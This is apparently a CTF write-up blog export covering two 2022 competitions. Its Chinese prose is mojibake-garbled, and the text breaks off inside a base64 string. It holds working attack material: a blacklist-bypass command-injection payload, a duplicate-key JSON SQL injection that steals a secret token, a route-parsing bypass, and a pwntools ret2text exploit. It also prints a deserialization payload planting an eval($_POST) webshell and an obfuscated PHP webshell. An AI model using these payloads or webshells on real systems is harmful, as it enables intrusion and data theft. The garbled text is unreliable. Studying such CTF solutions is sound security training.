robots.txtï¼Œå‘ç°å­˜åœ¨ fiag_ls_h3re.phpï¼Œ è®¿é—®å‘ç°å³é”®è¢«ç¦ç”¨ï¼ŒåŠ å‰ç¼€ view-source: æŸ¥çœ‹æºç å¾—flagã€‚ â€‹ EXEC 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);if(isset($_REQUEST[&quot;cmd&quot;]))&#123; $shell = $_REQUEST[&quot;cmd&quot;]; $shell = str_ireplace(&quot; &quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;\\n&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;\\t&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;?&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;*&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;&lt;&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;system&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;passthru&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;ob_start&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;getenv&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;putenv&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;mail&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;error_log&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;`&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;exec&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;shell_exec&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;echo&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;cat&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;ls&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;nl&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;tac&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;bash&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;sh&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;tcp&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;base64&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;flag&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;cp&quot;,&quot;&quot;,$shell); exec($shell);&#125;else&#123; highlight_file(__FILE__);&#125; å¸¦é»‘åå•çš„æ— å›æ˜¾RCEï¼Œå¯ä»¥é‡å®šå‘å†™å‘½ä»¤æ‰§è¡Œç»“æœåˆ°æ–‡ä»¶ï¼Œå…³é”®å­—å¯åŒå†™ç»•è¿‡ï¼Œç©ºæ ¼ç”¨$IFSç»•è¿‡ã€‚ åˆ—ç›®å½•ï¼š?cmd=llss$IFS/&gt;1.txtï¼Œå¾—åˆ°æ ¹ç›®å½•flagæ–‡ä»¶å ctf_is_fun_flag2021ï¼› è¯»æ–‡ä»¶ï¼š?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txtï¼Œå¾—åˆ°flagã€‚ â€‹ Languageæºç é‡Œæœ‰pythonå’Œgoä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ‰ä¸¤ä¸ªæœåŠ¡ï¼Œç«¯å£8000æ˜¯pythonå¼€çš„ï¼Œæ˜ å°„åˆ°å¯¹å¤–ç«¯å£ï¼›å†…ç½‘ç«¯å£5000æ˜¯goæœåŠ¡ã€‚pythonä»£ç ç›¸å½“äºä¸­è½¬ç«™æ¥å—å¤–ç½‘è¯·æ±‚ï¼Œå¤„ç†åè½¬å‘ç»™goï¼Œgoè¿›è¡Œåº•å±‚å¤„ç†ã€‚ goæœåŠ¡ä¸­å…³é”®ä»£ç  backend.goï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package controllerimport ( db &quot;ctf/database&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;github.com/buger/jsonparser&quot; &quot;io/ioutil&quot; &quot;net/http&quot;)type Language struct &#123; Id int32 `json:&quot;id&quot;` Name string `json:&quot;name&quot;` Votes int64 `json:&quot;votes&quot;`&#125;func Index(w http.ResponseWriter, _ *http.Request) &#123; ok(w, &quot;Hello World!&quot;)&#125;func List(w http.ResponseWriter, _ *http.Request) &#123; rows, err := db.Sqlite.Query(&quot;SELECT * FROM languages;&quot;) if err != nil &#123; fail(w, &quot;Something wrong&quot;) fmt.Println(err.Error()) return &#125; defer rows.Close() res := make([]Language, 0) for rows.Next() &#123; var pl Language _ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes) res = append(res, pl) &#125; err = json.NewEncoder(w).Encode(res)&#125;func Search(w http.ResponseWriter, r *http.Request) &#123; reqBody, _ := ioutil.ReadAll(r.Body) votes, err := jsonparser.GetInt(reqBody, &quot;votes&quot;) if err != nil &#123; fail(w, &quot;Error reading votes&quot;) return &#125; name, err := jsonparser.GetString(reqBody, &quot;name&quot;) if err != nil &#123; fail(w, &quot;Error reading name&quot;) return &#125; query := fmt.Sprintf(&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;, votes, name) rows, err := db.Sqlite.Query(query) if err != nil &#123; fail(w, &quot;Something wrong&quot;) fmt.Println(err.Error()) return &#125; res := make([]Language, 0) for rows.Next() &#123; var pl Language _ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes) res = append(res, pl) &#125; err = json.NewEncoder(w).Encode(res)&#125;func Flag(w http.ResponseWriter, r *http.Request ) &#123; action:= r.URL.Query().Get(&quot;action&quot;) if action == &quot;&quot; &#123; fail(w, &quot;Error getting action&quot;) return &#125; token:= r.URL.Query().Get(&quot;token&quot;) if token == &quot;&quot; &#123; fail(w, &quot;Error getting token&quot;) return &#125; var secret string row := db.Sqlite.QueryRow(&quot;SELECT secret FROM token;&quot;) if err := row.Scan(&amp;secret); err != nil &#123; fail(w, &quot;Error querying secret token&quot;) return &#125; if action == &quot;readFlag&quot; &amp;&amp; secret == token &#123; data, err := ioutil.ReadFile(&quot;flag&quot;) if err != nil &#123; fail(w, &quot;Error reading flag&quot;) return &#125; ok(w, fmt.Sprintf(&quot;Congrats this is your flag: %s&quot;, string(data))) return &#125; ok(w, &quot;Wrong token&quot;)&#125; è·¯ç”± /flag ä¸­GETä¸¤ä¸ªå‚æ•° ?action=readFlag&amp;token=xxxxxï¼Œtokenæ­£ç¡®å¾—flagï¼Œè€Œè·¯ç”± /search ä¸­å®¹æ˜“é€šè¿‡SQLæ³¨å…¥æ‹¿åˆ°tokenã€‚ pythonæœåŠ¡ä¸­ app.pyï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from flask import Flask, request, render_template, jsonifyfrom urllib.parse import unquoteimport requestsapp = Flask(__name__)server = &#x27;127.0.0.1:8000&#x27;@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/list&quot;, methods=[&quot;POST&quot;])def listAll(): r = requests.post(f&quot;http://&#123;server&#125;/api/list&quot;) return jsonify(r.json())@app.route(&quot;/search&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def search(): if request.method == &quot;GET&quot;: return render_template(&quot;search.html&quot;) else: data = request.json if data[&#x27;name&#x27;]: if not isinstance(data[&#x27;name&#x27;], str) or not data[&#x27;name&#x27;].isalnum(): return jsonify(&#123;&quot;error&quot;: &quot;Bad word detected&quot;&#125;) if data[&#x27;votes&#x27;]: if not isinstance(data[&#x27;votes&#x27;], int): return jsonify(&#123;&quot;error&quot;: &quot;Bad word detected&quot;&#125;) r = requests.post(f&quot;http://&#123;server&#125;/api/search&quot;, data=request.data) return jsonify(r.json())@app.route(&quot;/healthcheck&quot;, methods=[&quot;GET&quot;])def healthCheck(): getPath = [&quot;&quot;, &quot;flag&quot;] postPath = [&quot;api/list&quot;, &quot;api/search&quot;] try: for path in getPath: requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) for path in postPath: requests.post(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) except: return &quot;Down&quot; return &quot;OK&quot;@app.route(&quot;/&lt;path:path&gt;&quot;, methods=[&quot;GET&quot;])def handle(path): if &#x27;flag&#x27; in unquote(path): action = request.args.get(&#x27;action&#x27;) token = request.args.get(&#x27;token&#x27;) print(action) if action == &quot;readFlag&quot;: return jsonify(&#123;&quot;error&quot;: &quot;Sorry, readFlag is not permitted&quot;&#125;) r = requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;, params=&#123; &quot;action&quot;: action, &quot;token&quot;: token &#125;) else: r = requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) return jsonify(r.text)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) å‘ç°å…¶ä¸­å­˜åœ¨ä¸¤ä¸ªç‚¹éœ€è¦ç»•è¿‡ï¼š è·¯ç”± /search ä¸­JSONä¸¥æ ¼è¿‡æ»¤ï¼Œname çš„å€¼å¿…é¡»æ»¡è¶³ isalnum()ï¼Œvotes çš„å€¼å¿…é¡»ä¸ºæ•°å­—ï¼Œé¿å…SQLæ³¨å…¥æƒ…å†µï¼› æ£€æµ‹urlé‡Œä½¿ç”¨GETæ–¹æ³•ä¼ å…¥ action=readFlag ä¼šç›´æ¥æ‹’ç»ã€‚ å¯¹äºç¬¬1ç‚¹ï¼Œå°è¯•æ„é€ å«ä¸¤ä¸ª name å‚æ•°çš„JSONï¼Œåœ¨pythonä¸­è®¤JSONä¸­ç¬¬äºŒä¸ª nameï¼Œè€Œgoä¸­è®¤JSONä¸­ç¬¬ä¸€ä¸ª nameï¼Œåˆ©ç”¨è¿™ç§å·®å¼‚æ„é€ ï¼š&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;ï¼Œç»•è¿‡å¾—åˆ°tokenå€¼ï¼Œå¾—åˆ° re@l1y_4th_T0k3nã€‚ å¯¹äºç¬¬2ç‚¹ï¼Œåˆ©ç”¨ @app.route(&quot;/&lt;path:path&gt;&quot;) ç‰¹æ€§ï¼Œå¯¹ ? è¿›è¡Œurlç¼–ç å¯ä»¥åœ¨pythonå±‚é¢ç»•è¿‡GETå‚æ•°è¯†åˆ«ï¼Œå³ action = request.args.get(&#39;action&#39;) ä¸ä¼šè·å–åˆ°å†…å®¹ï¼Œpayloadï¼š/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3nã€‚ å¾—åˆ°flagï¼š&quot;&#123;\\&quot;msg\\&quot;:\\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\\\n\\&quot;&#125;\\n&quot; â€‹ REVERSEhiahia o(*^â–½^*)â”›IDAæŸ¥çœ‹ä¼ªç ï¼Œæ— é€†å‘ï¼Œç…§ç€å®ç°å°±è¡Œï¼š 123456789101112131415161718s=list(b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;)def flag(c,k): if k&gt;9: if k&amp;1==0: return c-11 else: return c+13 else: if k&amp;1==0: return c-3 else: return c+5t=&#x27;&#x27;for i in range(len(s)): t+=chr(flag(s[i],i))print(t)# flag&#123;RrrrEe33202111&#125; â€‹ ANDROIDjadxæŸ¥çœ‹MainActivityä¸»é€»è¾‘ï¼š 12345678910111213141516171819202122232425public void onClick(View view) &#123; String trim = this.input.getText().toString().trim(); int[] iArr = &#123;102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42&#125;; int[] iArr2 = &#123;42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42&#125;; if (trim.length() != 18) &#123; this.input.setText(&quot;FLAGé”™è¯¯&quot;); return; &#125; char[] charArray = trim.toCharArray(); for (int i = 0; i &lt; 17; i++) &#123; iArr2[i] = i % 2 == 0 ? charArray[i] ^ i : charArray[i] ^ charArray[i + 1]; &#125; String str = &quot;&quot;; for (int i2 = 0; i2 &lt; 18; i2++) &#123; str = str.concat(Integer.toHexString(iArr2[i2])).concat(&quot;,&quot;); &#125; System.out.println(str); for (int i3 = 0; i3 &lt; 18; i3++) &#123; if (iArr2[i3] != iArr[i3]) &#123; this.input.setText(&quot;FLAGé”™è¯¯ï¼&quot;); return; &#125; &#125; this.input.setText(&quot;FLAGæ­£ç¡®&quot;);&#125; ç”¨z3è§£ï¼š 12345678910111213141516171819202122232425from z3 import *flag=[BitVec(f&#x27;flag&#123;i&#125;&#x27;,7) for i in range(18)]out=[102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42]s=[42]*19ss=Solver()for i in range(17): if i%2==0: s[i]=flag[i]^i else: s[i]=flag[i]^flag[i+1]for i in range(18): ss.add(s[i]==out[i])ss.check()m=ss.model()res=&#x27;&#x27;for i in range(17): res+=(chr(m[flag[i]].as_long()))print(res)# flag&#123;Reverse__APP åŠ èŠ±æ‹¬å·é—­åˆï¼Œå¾—åˆ°flagï¼šflag{Reverse__APP} â€‹ WAY flag{md5(result)} æ£€æµ‹å¸¦upxå£³ï¼Œè„±å£³åIDAæŸ¥çœ‹ä¼ªç ï¼Œè¿·å®«é¢˜ï¼Œwsadä»£è¡¨ä¸Šä¸‹å·¦å³ï¼Œæå–è¿·å®«æ•°ç»„å¾—ï¼š 12345OIIIIOOIO#IOOOIIOIOIIIIII å®¹æ˜“å¾—åˆ°è·¯å¾„ï¼šsdsddwdï¼ŒMD5å¾—åˆ°flagï¼šflag{6654b3343f6f3f6223a721e7f65e87f8} â€‹ SPARKSparcæ¶æ„ï¼ŒIDAæ— æ³•åç¼–è¯‘ä¸ºä¼ªç ï¼Œç”¨Ghidraå¾—åˆ°ä¼ªç ä¸»é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839undefined8 main(void)&#123; longlong unaff_g7; int local_res7d3; undefined8 local_res7d7; undefined8 local_res7df; undefined8 local_res7e7; undefined8 local_res7ef; longlong local_res7f7; local_res7f7 = *(longlong *)(unaff_g7 + 0x28); local_res7d7 = 0; local_res7df = 0; local_res7e7 = 0x37463f3044413243; local_res7ef = 0x3429000000000000; puts(&quot;input_sparkle_flag_here:\\n&quot;); read(0,&amp;local_res7d7,0xc); local_res7d3 = 0; do &#123; if (9 &lt; local_res7d3) &#123; puts(&quot;good_job!&quot;);LAB_001008a0: if (local_res7f7 == *(longlong *)(unaff_g7 + 0x28)) &#123; return 0; &#125; /* WARNING: Subroutine does not return */ __stack_chk_fail(); &#125; *(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) = *(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + -0x2f; if (*(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) != *(char *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123; puts(&quot;incorrect\\n&quot;); goto LAB_001008a0; &#125; local_res7d3 = local_res7d3 + 1; &#125; while( true );&#125; é€»è¾‘ä¸ºè¾“å…¥flagå€¼é€å­—ç¬¦ -0x2f å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸ 0x37463f30444132433429 ç›¸ç­‰ï¼Œå³ROT47ã€‚ ç®€å•è¿˜åŸå¾—flagï¼šflag{fun_sparcX} â€‹ PWNEz_pwnç®€å•ret2textï¼š 123456from pwn import *r = remote(&#x27;hsc2019.site&#x27;,10891)r.recvline()pl = &#x27;a&#x27;*0x48 + p64(0x400741)r.sendline(pl)r.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›","slug":"match-é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›","date":"2022-01-08T10:00:01.000Z","updated":"2022-01-08T12:51:09.214Z","comments":true,"path":"2022/01/08/match-é•¿å®‰â€œæˆ˜ç–«â€ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›/","permalink":"https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/","excerpt":"","text":"â€‹ æ–°å† ç–«æƒ…è‚†è™å…¨çƒï¼Œè¿™ä¸€åœºç–«æƒ…é˜»å‡»æˆ˜ä¸ä»…æ˜¯æˆ‘å›½å«ç”Ÿå¥åº·é¢†åŸŸçš„ä¸€åœºæˆ˜ç–«ï¼Œä¹Ÿæ˜¯ç§‘å­¦æŠ€æœ¯é¢†åŸŸçš„ä¸€æ¬¡å¤§è€ƒã€‚åœ¨è¿™ä¸ªç‰¹æ®Šæ—¶æœŸï¼Œä¿éšœç½‘ç»œå®‰å…¨ï¼Œé˜²èŒƒåˆ©ç”¨æ–°å† è‚ºç‚ç–«æƒ…å®æ–½çš„ç½‘ç»œæ”»å‡»è¡Œä¸ºæ˜¯å…³ç³»å¹¿å¤§äººæ°‘ç¾¤ä¼—åˆ‡èº«åˆ©ç›Šçš„å¤§äº‹ã€‚å¦‚ç½‘ç»œæ”»å‡»è€…å°†è®¡ç®—æœºç—…æ¯’ã€æœ¨é©¬å’Œç§»åŠ¨æ¶æ„ç¨‹åºç­‰ä¼ªè£…æˆâ€œè‚ºç‚ç—…ä¾‹â€â€œé˜²æŠ¤é€šçŸ¥â€ç­‰ä¿¡æ¯ï¼Œé€šè¿‡é’“é±¼é‚®ä»¶ã€æ¶æ„é“¾æ¥ç­‰æ–¹å¼è¿›è¡Œä¼ æ’­ï¼Œé€ æˆç”¨æˆ·å®‰å…¨é—®é¢˜ã€‚ è¥¿å®‰æ•°æ‰€é«˜æ ¡å­¦ç”Ÿå›¢ä½“è”åˆå‘èµ·é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å…¬ç›Šç§‘æ™®èµ›å’Œé•¿å®‰æˆ˜ç–«â€œç½‘ç»œå®‰å…¨å«å£«â€å®ˆæŠ¤èµ›ï¼Œä¸€æ–¹é¢æå‡å…¨æ°‘ç–«æƒ…æœŸé—´çš„ç½‘ç»œå®‰å…¨æ„è¯†ä¸ç–«æƒ…ä¸­å¸¸è§é—®é¢˜çš„åº”å¯¹æªæ–½ï¼Œå¦ä¸€æ–¹é¢æå‡æˆ‘çœçš„ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”èƒ½åŠ›å’Œç½‘ç»œå®‰å…¨ä»ä¸šè€…æŠ€æœ¯èƒ½åŠ›ï¼ŒååŠ©ç”¨æˆ·æå‡ç½‘ç»œå®‰å…¨é˜²æŠ¤èƒ½åŠ›ï¼Œä¸ºæˆ˜èƒœæ–°å† è‚ºç‚æä¾›ç½‘ç»œç©ºé—´ä¿éšœã€‚ Rank: 14 MISCå…«å¦è¿·å®« ä¸€èµ·èµ°è¿·å®«å§ï¼Œè¦æäº¤å…¨æ‹¼éŸ³å­—ç¬¦å¥¥ èµ°è¿·å®«ï¼Œä¸²è”ç»è¿‡çš„å…«å¦å¯¹åº”æ–‡å­—ï¼šcazy&#123;æˆ˜é•¿æ™é•¿æˆ˜æ™æ²³é•¿å±±å±±å®‰æˆ˜ç–«ç–«æˆ˜ç–«å®‰ç–«é•¿å®‰æ™&#125;ï¼Œè½¬ä¸ºå…¨æ‹¼ï¼š cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125; â€‹ æœ´å®æ— åçš„å–è¯xpå†…å­˜å–è¯ï¼Œå…ˆåˆ¤æ–­profile volatility -f xp_sp3.raw imageinfo æŸ¥çœ‹è¿›ç¨‹ volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist å‘ç°notepadå’Œmspaintï¼ŒæŸ¥çœ‹è®°äº‹æœ¬ volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad æ‰¾åˆ°ä¿¡æ¯ï¼š 20211209(Encrypt)ã€‚ å†æŸ¥çœ‹æ¡Œé¢æ–‡ä»¶ volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;æ¡Œé¢&quot; æ‰¾åˆ°æ–‡ä»¶ flag.zip å’Œ flag.pngï¼Œåˆ†åˆ«dumpä¸‹æ¥ flag.png ä¸­æœ‰å¯†æ–‡ä¿¡æ¯ï¼š FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]ï¼Œ flag.zip æœ‰å¯†ç ï¼Œç”¨å‰é¢çš„ 20211209 è§£å¼€æ‰¾åˆ°åŠ å¯†ç®—æ³•ï¼š 1234567891011121314151617void Encrypt(string&amp; str)&#123; for(int i = 0; i &lt; str.length(); i++) &#123; if(str[i] &gt;=&#x27;a&#x27;&amp;&amp; str[i]&lt;=&#x27;w&#x27;) str[i]+=3; else if(str[i]==&#x27;x&#x27;) str[i]=&#x27;a&#x27;; else if(str[i]==&#x27;y&#x27;) str[i]=&#x27;b&#x27;; else if(str[i]==&#x27;z&#x27;) str[i]=&#x27;c&#x27;; else if(str[i]==&#x27;_&#x27;) str[i]=&#x27;|&#x27;; str[i] -= 32; &#125;&#125; è¿˜åŸflagï¼š 123456789101112131415161718192021222324252627s = list(b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;)t = &#x27;&#x27;def encrypt(x): if x &gt;= ord(&#x27;a&#x27;) and x &lt;= ord(&#x27;w&#x27;): x += 3 elif x == ord(&#x27;x&#x27;): x = ord(&#x27;a&#x27;) elif x == ord(&#x27;y&#x27;): x = ord(&#x27;b&#x27;) elif x == ord(&#x27;z&#x27;): x = ord(&#x27;c&#x27;) elif x == ord(&#x27;_&#x27;): x = ord(&#x27;|&#x27;) x -= 32 return xfor i in range(len(s)): for j in range(128): if encrypt(j) == s[i]: t += chr(j) break else: t += &#x27;?&#x27;print(t)# cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125; ? æ”¹ _ ï¼Œå¾—åˆ°flagï¼šcazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125; â€‹ æ— å­—å¤©ä¹¦åœ¨æµé‡åŒ…ä¸­å‘ç° secret æµé‡ï¼Œdumpå¾—åˆ°gzipåŒ…ï¼Œå†…å®¹ä¸ºä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å« 504B0304ï¼Œè½¬å­˜ä¸ºzipæ–‡ä»¶ï¼Œå†…å« flag.txt å’Œ key.ws ä¸¤ä¸ªçº¯ç©ºç™½å­—ç¬¦æ–‡ä»¶ã€‚ key.ws ä¸­åŒ…å«ç©ºæ ¼ä¸tabå­—ç¬¦åŠå¤§é‡æ¢è¡Œç¬¦ï¼Œä¸ºwhitespaceè¯­è¨€ï¼Œåœ¨çº¿è¿è¡Œå¾—åˆ°è¾“å‡º XiAnWillBeSafeï¼› flag.txt ä¸­åŒ…å«å¤§é‡ç©ºæ ¼ä¸tabå­—ç¬¦ï¼Œä¸ºsnowéšå†™ï¼Œå¯†ç  XiAnWillBeSafeï¼Œè§£å¯†ï¼š SNOW.EXE -C -p XiAnWillBeSafe flag.txtï¼Œå¾—åˆ°flagï¼š cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125; â€‹ è¥¿å®‰åŠ æ²¹åœ¨æµé‡åŒ…ä¸­å‘ç° secret.txt æµé‡ï¼Œdumpä¸‹æ¥base64è§£ç å¾—åˆ°zipæ–‡ä»¶ï¼š 1234import base64f = open(&#x27;secret.txt&#x27;,&#x27;rb&#x27;).read()open(&#x27;out.zip&#x27;,&#x27;wb&#x27;).write(base64.b64decode(f)) æ‰“å¼€ä¸ºæ‹¼å›¾ï¼Œå…±48å¼ ï¼Œé€‰æ‹©å¸¦flagçš„éƒ¨åˆ†å›¾ç‰‡çº¯æ‰‹æ‹¼ï¼š flagï¼šcazy&#123;make_XiAN_great_Again&#125; â€‹ ez_EncryptæŸ¥çœ‹æµé‡ï¼Œå‘ç°æ˜¯èšå‰‘æµé‡ï¼Œå…¶ä¸­ä¸€ä¸ªæµä¸­ TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D base64è§£ç ä¸º O:39:&quot;League\\Flysystem\\Cached\\Storage\\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\\Flysystem\\Adapter\\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;ï¼Œ è¯´æ˜é€šè¿‡ååºåˆ—åŒ–æ¼æ´å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ æ‰¾åˆ°ä¸€é•¿ä¸²base64ç¼–ç å­—ç¬¦ä¸²ï¼Œè§£ç ä¿å­˜ä¸º www.zip æºç ï¼Œåœ¨ app\\controller\\Index.php ä¸­æ‰¾åˆ°æ··æ·†å¤„ç†è¿‡çš„é©¬ï¼š 1&lt;?php define(&#x27;IKlSux1227&#x27;,__FILE__);$DusPFr=base64_decode(&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL(&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZm